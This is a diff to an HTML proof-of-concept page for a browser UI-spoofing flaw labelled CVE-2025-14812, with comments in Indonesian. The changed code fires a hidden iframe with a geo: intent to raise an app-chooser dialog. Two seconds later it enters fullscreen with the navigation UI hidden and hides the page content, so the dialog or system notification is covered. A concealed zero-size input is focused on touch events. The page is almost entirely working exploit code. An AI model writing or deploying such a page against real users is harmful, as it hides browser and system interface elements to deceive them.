@@ -2,8 +2,8 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CVE-2025-14812 Inspired PoC with Dialog & Delayed Fullscreen</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <title>Advanced CVE-2025-14812 Combined PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -15,8 +15,9 @@
         display: flex;
         align-items: center;
         justify-content: center;
+        overflow: hidden;
       }
-      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
+      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
       button {
         width: 100%;
         max-width: 360px;
@@ -41,10 +42,27 @@
         padding: 0 10px;
       }
     </style>
+    <script>
+      // Touch event handlers untuk manajemen fokus/blur input sentuh seluler
+      addEventListener("touchstart", (event) => {});
+      window.ontouchstart = (event) => {
+        let input = document.getElementById("focusInput");
+        if (input) input.focus();
+      };
+      
+      addEventListener("touchend", (event) => {});
+      window.ontouchend = (event) => {
+        let input = document.getElementById("focusInput");
+        if (input) input.blur();
+      };
+    </script>
   </head>
   <body>
-    <div class="container">
-      <button id="execBtn">INITIALIZE CONTEXT SPOOF TEST</button>
+    <!-- Hidden focus management input -->
+    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />
+
+    <div class="container" id="mainContainer">
+      <button id="execBtn">INITIALIZE ADVANCED SPOOF & INTENT</button>
       <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
@@ -53,29 +71,37 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = function () {
-        statusInfo.innerText = "Status: Deploying subframe origin context & triggering dialog...";
+        statusInfo.innerText = "Status: Deploying context vector & intent dialog...";
         this.style.display = "none";
 
         try {
-          // 1. Langsung memicu sub-frame URI-scheme untuk memunculkan dialog aplikasi (Maps/Grab) saat tombol ditekan[span_0](start_span)[span_0](end_span)
+          // 1. Memicu iframe geo: intent untuk menampilkan dialog "Open with" secara instan
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
           spoofFrame.src = "geo:0,0?q=apple.com";
           document.body.appendChild(spoofFrame);
 
-          statusInfo.innerText = "Status: Dialog triggered. Entering fullscreen in 2 seconds...";
+          statusInfo.innerText = "Status: Dialog triggered. Locking fullscreen with hidden UI in 2s...";
 
-          // 2. Berpindah ke mode Fullscreen secara otomatis setelah jeda 2 detik untuk menutupi notifikasi sistem
+          // 2. Eksekusi Fullscreen dengan navigasi tersembunyi setelah jeda 2 detik
           setTimeout(() => {
             let docElement = document.documentElement;
+            
             if (docElement.requestFullscreen) {
-              docElement.requestFullscreen().catch((err) => {
+              docElement.requestFullscreen({ navigationUI: "hide" }).catch((err) => {
                 console.debug("Fullscreen restricted:", err.message);
               });
-            } else if (docElement.webkitRequestFullscreen) { /* Safari / Mobile Webkit */
+            } else if (docElement.webkitRequestFullscreen) { /* Fallback WebKit lama */
               docElement.webkitRequestFullscreen();
             }
-            statusInfo.innerText = "Status: Fullscreen active over dialog/notification state.";
+
+            // Menyembunyikan elemen kontainer informasi setelah masuk fullscreen penuh
+            let container = document.getElementById("mainContainer");
+            if (container) {
+              container.style.display = "none";
+            }
+            
+            statusInfo.innerText = "Status: Fullscreen active & UI locked over dialog state.";
           }, 2000);
 
         } catch (err) {
